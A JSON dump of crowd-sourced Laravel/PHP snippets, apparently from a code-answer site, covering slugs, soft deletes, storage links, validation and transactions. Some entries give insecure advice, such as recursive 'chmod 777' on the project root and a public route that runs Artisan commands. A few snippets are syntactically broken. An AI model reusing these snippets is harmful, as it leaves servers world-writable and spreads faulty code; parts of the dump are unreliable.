    "id": 2690,
    "keyword": null,
    "link": null,
    "title": " laravel set field unique",
    "description": "Schema::table('manufacturers', function($table) {     $table->string('name')->unique();  }); \n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2691,
    "keyword": null,
    "link": null,
    "title": " laravel setup auth",
    "description": "// Only for laravel 6.x and higher composer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\n// Laravel 5.x php artisan make:auth\nphp artisan migrate npm install && npm run dev \n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2692,
    "keyword": null,
    "link": null,
    "title": " laravel show routes artisan",
    "description": "php artisan route:list\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2693,
    "keyword": null,
    "link": null,
    "title": " laravel sidebar menu active",
    "description": "{{  request()->routeIs('news.*') ? 'active' : '' }}\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2694,
    "keyword": null,
    "link": null,
    "title": " laravel simplexmlelement xml add attribute",
    "description": "<?php   function array_to_xml( $data, &$xml_data ) {         foreach( $data as $key => $value ) {             if (!empty($value)) {                 if( is_array($value)) {                     if (!empty($value[\"@attributes\"])) {                             $subnode = $xml_data->addChild($key, $value[\"@value\"]);                             foreach ($value[\"@attributes\"] as $key1 => $val1) {                                 $subnode->addAttribute($key1, $val1);                             }                     } else if ($key == \"@value\") {                         foreach ($value as $attr => $attrVal) {                             $subnode = $xml_data->addChild(\"$attr\", $attrVal);                             array_to_xml($attrVal, $subnode);                         }                     } else {                             if (!empty($value)) {                                     $subnode = $xml_data->addChild($key);                                     array_to_xml($value, $subnode);                             }                     }                 } else {                         $xml_data->addChild(\"$key\",$value);                 }             }         }     }  $xml_data = new SimpleXMLElement('<?xml version=\"1.0\"?><data></data>');  $arrXml = [     \"categories\" => [         'category' => [             '@attributes' => [                 'id' => '123',                 'parent_id' => '12345'             ],             '@value' => 'Bikes'         ]     ],     \"properties\" => [         'property' => [             'id' => '123',             'categoryId' => '1',             'name' => 'Color',             'values' => [                 'value' => [                     \"id\" => '1',                     \"name\" => 'Black'                 ],                 'value' => [                     \"id\" => '2',                     \"name\" => 'White'                 ]             ]         ]     ],     \"products\" => [         'products' => [             'id' => '1231231',             'categoryId' => '123',             'model' => [                     '@attributes' => [                             'foo' => 'bar',                     ],                 '@value' => 'Avalanche'             ],             'article' => '1.0 2011',             'vendor' => 'GT',         ]     ] ];  array_to_xml($arrXml,$xml_data);  //saving generated xml file; $result = $xml_data->asXML('test.xml'); \n<?php  include 'example.php';  $sxe = new SimpleXMLElement($xmlstr); $sxe->addAttribute('type', 'documentary');  $movie = $sxe->addChild('movie'); $movie->addChild('title', 'PHP2: More Parser Stories'); $movie->addChild('plot', 'This is all about the people who make it work.');  $characters = $movie->addChild('characters'); $character  = $characters->addChild('character'); $character->addChild('name', 'Mr. Parser'); $character->addChild('actor', 'John Doe');  $rating = $movie->addChild('rating', '5'); $rating->addAttribute('type', 'stars');  echo $sxe->asXML();  ?> \n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2695,
    "keyword": null,
    "link": null,
    "title": " laravel slug",
    "description": "use Illuminate\\Support\\Str;  $slug = Str::slug('Laravel 5 Framework', '-');  // laravel-5-framework\n$ composer require cviebrock/eloquent-sluggable\nphp artisan vendor:publish --provider=\"Cviebrock\\EloquentSluggable\\ServiceProvider\"\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2696,
    "keyword": null,
    "link": null,
    "title": " laravel sluggable",
    "description": "$ composer require cviebrock/eloquent-sluggable\nuse Cviebrock\\EloquentSluggable\\Sluggable;  class Post extends Model {     use Sluggable;      /**      * Return the sluggable configuration array for this model.      *      * @return array      */     public function sluggable()     {         return [             'slug' => [                 'source' => 'title'             ]         ];     } }\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2697,
    "keyword": null,
    "link": null,
    "title": " laravel soft delete",
    "description": "Product::find($id)->forceDelete();\nSoft Delete : $user->delete(); Force Delete : $user->forceDelete(); Restore Soft Deleted Item : $user->restore();\nPost::withTrashed()->find($post_id)->restore(); \n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\n$flights = Flight::where('active', 1)                ->orderBy('name')                ->take(10)                ->get();\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2698,
    "keyword": null,
    "link": null,
    "title": " laravel sort collection",
    "description": "$response = $f_games->merge($s_games)->sortByDesc('id')->values(); \n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sortDesc();  $sorted->values()->all();  // [5, 4, 3, 2, 1]\n$collection = collect([     ['name' => 'Taylor Otwell', 'age' => 34],     ['name' => 'Abigail Otwell', 'age' => 30],     ['name' => 'Taylor Otwell', 'age' => 36],     ['name' => 'Abigail Otwell', 'age' => 32], ]);  $sorted = $collection->sortBy([     fn ($a, $b) => $a['name'] <=> $b['name'],     fn ($a, $b) => $b['age'] <=> $a['age'], ]);  $sorted->values()->all();  /*     [         ['name' => 'Abigail Otwell', 'age' => 32],         ['name' => 'Abigail Otwell', 'age' => 30],         ['name' => 'Taylor Otwell', 'age' => 36],         ['name' => 'Taylor Otwell', 'age' => 34],     ] */\n$posts = Post::orderBy('id', 'DESC')->get(); \n$collection = collect([     ['name' => 'Desk', 'price' => 200],     ['name' => 'Chair', 'price' => 100],     ['name' => 'Bookcase', 'price' => 150], ]);  $sorted = $collection->sortBy('price');  $sorted->values()->all();  /*     [         ['name' => 'Chair', 'price' => 100],         ['name' => 'Bookcase', 'price' => 150],         ['name' => 'Desk', 'price' => 200],     ] */\n$results = Project::orderBy('name')->get();\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2699,
    "keyword": null,
    "link": null,
    "title": " laravel sort collection by key",
    "description": "$collection = collect([     ['name' => 'Desk', 'price' => 200],     ['name' => 'Chair', 'price' => 100],     ['name' => 'Bookcase', 'price' => 150], ]);  $sorted = $collection->sortBy('price');  $sorted->values()->all();  /*     [         ['name' => 'Chair', 'price' => 100],         ['name' => 'Bookcase', 'price' => 150],         ['name' => 'Desk', 'price' => 200],     ] */\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2700,
    "keyword": null,
    "link": null,
    "title": " laravel sortby relationship column",
    "description": "$users = User::with(['student' => function ($q) {             $q->orderBy('id', 'desc');         }]);\nadd the code to relationship in the method of the model    public function room(){       return $this->hasMany(room::class,  'id')->orderBy('id', 'DESC') ; }\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2701,
    "keyword": null,
    "link": null,
    "title": " laravel sortby varchar date",
    "description": "$items = DB::table(\"mytable\")->where('userId','=',$userId)->orderByRaw(\"DATE_FORMAT('d-m-Y',startDate), ASC\")->get(); \n$sorted = $transaction->sortBy(function($col) {     return $col; })->values()->all();\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2702,
    "keyword": null,
    "link": null,
    "title": " laravel sotrage linkl",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2703,
    "keyword": null,
    "link": null,
    "title": " laravel spatie asigne role",
    "description": "$user->assignRole('writer');  // You can also assign multiple roles at once $user->assignRole('writer', 'admin'); // or as an array $user->assignRole(['writer', 'admin']); \n$users = User::role('writer')->get(); \n$role->givePermissionTo($permission); $permission->assignRole($role); \n$role->syncPermissions($permissions); $permission->syncRoles($roles); \ncd ~/Sites laravel new mypermissionsdemo cd mypermissionsdemo git init git add . git commit -m \"Fresh Laravel Install\"  # Environment cp -n .env.example .env sed -i '' 's/DB_CONNECTION=mysql/DB_CONNECTION=sqlite/' .env sed -i '' 's/DB_DATABASE=/#DB_DATABASE=/' .env touch database/database.sqlite  # Package composer require spatie/laravel-permission php artisan vendor:publish --provider=\"Spatie\\Permission\\PermissionServiceProvider\" git add . git commit -m \"Add Spatie Laravel Permissions package\" php artisan migrate:fresh  # Add `HasRoles` trait to User model sed -i '' $'s/use Notifiable;/use Notifiable;\\\\\\n    use \\\\\\\\Spatie\\\\\\\\Permission\\\\\\\\Traits\\\\\\\\HasRoles;/' app/User.php sed -i '' $'s/use HasFactory, Notifiable;/use HasFactory, Notifiable;\\\\\\n    use \\\\\\\\Spatie\\\\\\\\Permission\\\\\\\\Traits\\\\\\\\HasRoles;/' app/Models/User.php git add . && git commit -m \"Add HasRoles trait\"  # Add Laravel's basic auth scaffolding composer require laravel/ui --dev php artisan ui bootstrap --auth # npm install && npm run prod git add . && git commit -m \"Setup auth scaffold\" \n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2704,
    "keyword": null,
    "link": null,
    "title": " laravel stoage link brakes when pushed on production",
    "description": "Route::get('/linkstorage', function () {     Artisan::call('storage:link'); }); \n",
    "reg_date": "2021-10-12T10:16:43.000Z"
  },
  {
    "id": 2705,
    "keyword": null,
    "link": null,
    "title": " laravel storage",
    "description": "How to get base path(Project Root) in laravel ? base_path(); // Path of application root   How to get storage folder path in laravel ? storage_path(); // Path of storage/   How to get app folder path in laravel ? app_path(); // Path of app/\nuse Illuminate\\Support\\Facades\\Storage;  $path = Storage::path('file.jpg');\nuse Illuminate\\Support\\Facades\\Storage;  Storage::disk('local')->put('example.txt', 'Contents');\n$path = $request->file('avatar')->store(     'avatars', 'public' ); \n$exists = Storage::disk('s3')->exists('file.jpg');\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2706,
    "keyword": null,
    "link": null,
    "title": " laravel storage check file exists",
    "description": "Storage::disk('public')->exists($image)\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2707,
    "keyword": null,
    "link": null,
    "title": " laravel storage folder permissions",
    "description": "cd [..LARAVEL PROJECT ROOT] sudo find . -type f -exec chmod 644 {} \\; sudo find . -type d -exec chmod 755 {} \\; sudo chmod -R 777 ./storage sudo chmod -R 777 ./bootstrap/cache/\nsudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\ncd /path/to/root; sudo chmod -R 777 ./  sudo chown -R www-data:www-data ./ sudo usermod -a -G www-data ubuntu sudo find ./ -type f -exec chmod 644 {} \\; sudo find ./ -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2708,
    "keyword": null,
    "link": null,
    "title": " laravel storage get file path",
    "description": "$path = storage_path('app/file.txt'); \n$contents = Storage::disk('local')->get('file.txt');\nuse Illuminate\\Support\\Facades\\Storage;  $path = Storage::path('file.jpg');\n$path = $request->file('avatar')->store(     'avatars', 'public' ); \n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2709,
    "keyword": null,
    "link": null,
    "title": " laravel storage hard link",
    "description": "php artisan storage:link\n$attachment = TicketAttachment::find($id); $headers = [     'Content-Type'        => 'application/jpeg',     'Content-Disposition' => 'attachment; filename=\"'. $attachment->name .'\"', ]; return \\Response::make(Storage::disk('s3')->get($attachment->url), 200, $headers);\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2710,
    "keyword": null,
    "link": null,
    "title": " laravel storage not found",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2711,
    "keyword": null,
    "link": null,
    "title": " laravel store link",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2712,
    "keyword": null,
    "link": null,
    "title": " laravel string builder",
    "description": "$string = \"start\"; $string .= \"appended string\"; $string .= \"appended string\"; etc. \n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2713,
    "keyword": null,
    "link": null,
    "title": " laravel string capitalize in view",
    "description": "{{ ucfirst($name) }}\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2714,
    "keyword": null,
    "link": null,
    "title": " laravel string key",
    "description": "class UserVerification extends Model {     protected $primaryKey = 'your_key_name'; // or null      public $incrementing = false;      // In Laravel 6.0+ make sure to also set $keyType     protected $keyType = 'string'; } \n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2715,
    "keyword": null,
    "link": null,
    "title": " laravel success message",
    "description": "return redirect()->back()->with('message', 'IT WORKS!');  Displaying message if it exists:  @if(session()->has('message'))     <div class=\"alert alert-success\">         {{ session()->get('message') }}     </div> @endif\n//If it didn't help (still, keep routes.php without web middleware), you can try little bit different approach:  return redirect()->back()->with('message', 'IT WORKS!'); // Displaying message if it exists:  @if(session()->has('message'))     <div class=\"alert alert-success\">         {{ session()->get('message') }}     </div> @endif\n",
    "reg_date": "2021-10-12T10:16:44.000Z"
  },
  {
    "id": 2716,
    "keyword": null,
    "link": null,
    "title": " laravel sum group by",
    "description": "Document::groupBy('users_editor_id')    ->selectRaw('sum(no_of_pages) as sum, users_editor_id')    ->pluck('sum','users_editor_id');     // originally lists(), which was deprecated in favour of pluck in 5.2    // and dropped completely in 5.3    // ->lists('sum','users_editor_id');   // returns array like this: array(   users_editor_id => sum,   ... )\n$docs = Document::groupBy('users_editor_id')    ->selectRaw('sum(no_of_pages) as sum, users_editor_id')    ->get(); //this return collection   //In Blade @foreach($docs as $doc) \t{{$doc->users_editor_id}} >-------< {{$doc->sum}} @endforeach\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2717,
    "keyword": null,
    "link": null,
    "title": " laravel sum relationship column",
    "description": "Product::where('id',$id)->sum('quantity');\nAuth::user()->products->sum('price'); \n$balance = DB::table('data')->where('user_id' '=' $id)->sum('balance');\nAuth::user()->products->sum('price'); // And on your App/User.php you need someting like this: public function products(){   return Products::where('id_buyer', Auth::user()->id)->get(); }\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2718,
    "keyword": null,
    "link": null,
    "title": " laravel symlink command",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2719,
    "keyword": null,
    "link": null,
    "title": " laravel table data types",
    "description": "$table->bigIncrements('id'); \tIncrementing ID using a \"big integer\" equivalent. $table->bigInteger('votes'); \tBIGINT equivalent to the table $table->binary('data'); \tBLOB equivalent to the table $table->boolean('confirmed'); \tBOOLEAN equivalent to the table $table->char('name', 4); \tCHAR equivalent with a length $table->date('created_at'); \tDATE equivalent to the table $table->dateTime('created_at'); \tDATETIME equivalent to the table $table->decimal('amount', 5, 2); \tDECIMAL equivalent with a precision and scale $table->double('column', 15, 8); \tDOUBLE equivalent with precision, 15 digits in total and 8 after the decimal point $table->enum('choices', array('foo', 'bar')); \tENUM equivalent to the table $table->float('amount'); \tFLOAT equivalent to the table $table->increments('id'); \tIncrementing ID to the table (primary key). $table->integer('votes'); \tINTEGER equivalent to the table $table->longText('description'); \tLONGTEXT equivalent to the table $table->mediumInteger('numbers'); \tMEDIUMINT equivalent to the table $table->mediumText('description'); \tMEDIUMTEXT equivalent to the table $table->morphs('taggable'); \tAdds INTEGER taggable_id and STRING taggable_type $table->nullableTimestamps(); \tSame as timestamps(), except allows NULLs $table->smallInteger('votes'); \tSMALLINT equivalent to the table $table->tinyInteger('numbers'); \tTINYINT equivalent to the table $table->softDeletes(); \tAdds deleted_at column for soft deletes $table->string('email'); \tVARCHAR equivalent column $table->string('name', 100); \tVARCHAR equivalent with a length $table->text('description'); \tTEXT equivalent to the table $table->time('sunrise'); \tTIME equivalent to the table $table->timestamp('added_on'); \tTIMESTAMP equivalent to the table $table->timestamps(); \tAdds created_at and updated_at columns $table->rememberToken(); \tAdds remember_token as VARCHAR(100) NULL ->nullable() \tDesignate that the column allows NULL values ->default($value) \tDeclare a default value for a column ->unsigned() \tSet INTEGER to UNSIGNED\n$table->dropForeign('posts_user_id_foreign');\nDB::statement(\"ALTER TABLE <table name> ADD <column name> MEDIUMBLOB\");\n// in laravel if error of missing pdomysql driver issue the command // composer require doctrine/dbal DB::connection()->getDoctrineColumn($table_name, $field_name)->getType()->getName()\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2720,
    "keyword": null,
    "link": null,
    "title": " laravel table in model",
    "description": "protected $table = 'DomainRelatedSettings'; \n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\npublic $table = \"dpl_user\";  protected $fillable = [ 'user_id', 'fname', 'lname', 'email', 'phone', 'msg'];\n<?php  $flights = App\\Models\\Flight::all();  foreach ($flights as $flight) {     echo $flight->name; }\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2721,
    "keyword": null,
    "link": null,
    "title": " laravel target class does not exist",
    "description": "//accessing any function in the controller (this is web.php file) use App\\Http\\Controllers\\PostsController;  Route::get('/post', 'App\\Http\\Controllers\\PostsController@index');\nUncomment this line in app>>provider>>RouteServiceProvider.php file // protected $namespace = 'App\\\\Http\\\\Controllers';\n Route::get('/users', [UserController::class, 'index']);\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2722,
    "keyword": null,
    "link": null,
    "title": " laravel throw function",
    "description": "public function isValid($value) {     try {         // Validate the value...     } catch (Throwable $e) {         report($e);          return false;     } }\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2723,
    "keyword": null,
    "link": null,
    "title": " laravel time to human redable format",
    "description": "$comment->created_at->diffForHumans();\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2724,
    "keyword": null,
    "link": null,
    "title": " laravel timestamp soft delete",
    "description": "<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model; use Illuminate\\Database\\Eloquent\\SoftDeletes;  class Flight extends Model {     use SoftDeletes; }\n",
    "reg_date": "2021-10-12T10:16:45.000Z"
  },
  {
    "id": 2725,
    "keyword": null,
    "link": null,
    "title": " laravel timestamps on pivot table",
    "description": "return $this->belongsToMany('TableModelClassName')->using('PivotTableModelClassName')->withTimestamps(); \n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2726,
    "keyword": null,
    "link": null,
    "title": " laravel tinker generate password",
    "description": "$user = App\\User::where('email', 'user@example.com')->first(); $user->password = Hash::make('password'); $user->save();\nphp artisan tinker echo Hash::make('yourpassword');\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2727,
    "keyword": null,
    "link": null,
    "title": " laravel tinker update password",
    "description": "$user = App\\User::where('email', 'user@example.com')->first(); $user->password = Hash::make('password'); $user->save();\nphp artisan tinker echo Hash::make('yourpassword');\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2728,
    "keyword": null,
    "link": null,
    "title": " laravel title dynamic",
    "description": "<!-- Stored in resources/views/layouts/master.blade.php -->  <html>     <head>         <title>App Name | @yield('mytitle')</title>     </head>     <body>         <div class=\"container\">             @yield('content')         </div>     </body> </html>    <!-- Extending the master.blade.php into another view file. Eg. About Us Page -->  @extends('layouts.master')  @section('mytitle', 'About Us')  @section('content')     <h1>\"Let's Go\"</h1> @endsection\n<html> <head>     <title>App Name - @yield('title')</title> </head> <body>     @section('sidebar')         This is the master sidebar.     @show      <div class=\"container\">         @yield('content')     </div> </body>    <!-- Then you can extend pages using code below as guide  -->      @extends('layouts.master')    @section('title', 'Page Title')    @section('sidebar')   @parent   \t<p>This is appended to the master sidebar.</p>   @endsection    @section('content')   <p>This is my body content.</p>   @endsection\n<html> <head>     <title>App Name - @yield('title')</title> </head> <body>     @section('sidebar')         This is the master sidebar.     @show      <div class=\"container\">         @yield('content')     </div> </body>         @extends('layouts.master')  @section('title', 'Page Title')  @section('sidebar') @parent  <p>This is appended to the master sidebar.</p> @endsection  @section('content') <p>This is my body content.</p> @endsection \nzx zzzzzzzzzzzz\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2729,
    "keyword": null,
    "link": null,
    "title": " laravel token logout",
    "description": "public function logout (Request $request) { $accessToken = auth()->user()->token(); $token= $request->user()->tokens->find($accessToken); $token->revoke(); return response(['message' => 'You have been successfully logged out.'], 200); }\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2730,
    "keyword": null,
    "link": null,
    "title": " laravel trans with parameters",
    "description": "//Laravel message localization uses named, not numeric, parameters.  //Rewriting your example message:  'string1' => 'Welcome :user, Please meet :other', //You can now use, for example:  trans('string1', [ 'user' => 'Ainsley', 'other' => 'Hayden' ]);\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2731,
    "keyword": null,
    "link": null,
    "title": " laravel transactions",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\nDB::beginTransaction(); try { /** Statement */   DB::commit(); }  catch (\\Exception $e) { /** Statement if failed */ DB::rollback(); }\nDB::transaction(function() {       // }); \nStart the transaction on the same connection your query will run on.\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2732,
    "keyword": null,
    "link": null,
    "title": " laravel transform object to array",
    "description": "$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$users = App\\User::all(); $users = $users->toArray();\nfunction objectToArray(&$object) {     return @json_decode(json_encode($object), true); } \n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2733,
    "keyword": null,
    "link": null,
    "title": " laravel trim string blade",
    "description": "{{Str::limit($category->name, 20)}}  if to end     {{Str::limit($category->name, 20, $end='.......')}}               or    {{\\Illuminate\\Support\\Str::limit($category->name, 20)}}            \n#at AppServiceProvider  Blade::directive('trim', function ($string) {             $string = urldecode($string);             $string = trim($string);             return \"<?php echo $string; ?>\";         });  #And use on Blade template  @trim('Hello world !')\n{{ \\Illuminate\\Support\\Str::limit($productVal, 20, $end='...') }}\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2734,
    "keyword": null,
    "link": null,
    "title": " laravel truncate string laravel 8",
    "description": "use Illuminate\\Support\\Str;  $truncated = Str::limit('The quick brown fox jumps over the lazy dog', 20);  // The quick brown fox...\n",
    "reg_date": "2021-10-12T10:16:46.000Z"
  },
  {
    "id": 2735,
    "keyword": null,
    "link": null,
    "title": " laravel turn off timestamps",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     public $timestamps = false;      // }\npublic $timestamps = false; (In the model which you need to disable)\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2736,
    "keyword": null,
    "link": null,
    "title": " laravel ui",
    "description": "composer require laravel/ui\t\t\t// install laravel/ui  // **optional** php artisan ui bootstrap --auth\t\t// login-reg scaffolinding \ncomposer require laravel/ui php artisan ui vue --auth\ncomposer require laravel/ui:^2.4\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2737,
    "keyword": null,
    "link": null,
    "title": " laravel ui auth",
    "description": "//Run the bolow commands to install laravel ui package composer require laravel/ui php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui  php artisan ui bootstrap  php artisan ui bootstrap --auth  npm install && npm run dev\nAuth::logout();\n$id = \\Auth::id();\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\ncomposer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2738,
    "keyword": null,
    "link": null,
    "title": " laravel unique multiple columns",
    "description": "$table->unique(['mytext', 'user_id']);\n'mobile_no'    => 'unique:users,mobile_no,NULL,id,country_id,'.request('country_id');\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2739,
    "keyword": null,
    "link": null,
    "title": " laravel unique title except id on edit",
    "description": "'email' => 'unique:users,email_address,'.$user->id \n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2740,
    "keyword": null,
    "link": null,
    "title": " laravel unique validation",
    "description": "/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\nuse Illuminate\\Validation\\Rule;  public function rules() {     return [ \t    'title' => [ \t\t    'required', \t\t    Rule::unique('posts', 'title')->ignore($this->post) \t    ]     ];  } \n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\nunique:table,column,except,idColumn  ############## Example : ################  ############### For Updating   //rules 'email' => 'unique:users,email_address,' . $userId,  ############### For Creating  //rules 'email' => 'unique:users,email_address',\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n# <values> = foo,bar,... # <field> = array field # <characters> = amount of characters  # accepted\t\t\t\t\t           # active_url # after:<tomorrow>\t\t\t           # after_or_equal:<tomorrow> # alpha\t\t\t\t\t\t           # alpha_dash # alpha_num\t\t\t\t\t           # array # bail \t\t\t\t\t               # before:<today> # before_or_equal:<today>              # between:min,max # boolean\t\t\t\t\t           # confirmed # date\t\t\t\t\t\t           # date_equals:<today> # date_format:<format> \t\t           # different:<name> # digits:<value>\t\t\t           # digits_between:min,max # dimensions:<min/max_with>\t           # distinct # email\t\t\t\t\t\t           # ends_with:<values> # exclude_if:<field>,<value>           # exclude_unless:<field>,<value> # exists:<table>,<column>\t           # file # filled\t\t\t\t\t           # gt:<field> # gte:<field>\t\t\t\t           # image # in:<values>\t\t\t\t           # in_array:<field> # integer\t\t\t\t\t           # ip # ipv4                                 # ipv6   # json\t\t\t\t\t\t           # lt:<field> # lte:<field>       \t\t           # max:<value> # mimetypes:video/avi,...\t           # mimes:jpeg,bmp,png # min:<value>\t\t\t\t           # not_in:<values> # not_regex:<pattern> \t\t           # nullable # numeric\t\t\t\t\t           # password:<auth guard> # present\t\t\t\t\t           # regex:<pattern> # required\t\t\t\t\t           # required_if:<field>,<value> # required_unless:<field>,<value>      # required_with:<fields> # required_with_all:<fields>\t       # required_without:<fields> # required_without_all:<fields>        # same:<field> # size:<characters>\t\t\t           # starts_with:<values> # string\t\t\t\t\t\t       # timezone # unique:<table>,<column>\t\t       # url # uuid\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2741,
    "keyword": null,
    "link": null,
    "title": " laravel unique validation on multiple columns",
    "description": "$table->unique(['mytext', 'user_id']);\n'name' => 'unique:table,field,NULL,id,field1,value1,field2,value2,field3,value3'\n'mobile_no'    => 'unique:users,mobile_no,NULL,id,country_id,'.request('country_id');\n",
    "reg_date": "2021-10-12T10:16:47.000Z"
  },
  {
    "id": 2742,
    "keyword": null,
    "link": null,
    "title": " laravel updateOrCreate",
    "description": "// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n$user = User::updateOrCreate(     ['email' =>  request('email')],     ['name' => request('name')] );  // Do other things with the User  \n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\nfirstOrCreate() will automatically create a new entry in the database if there is not match found. 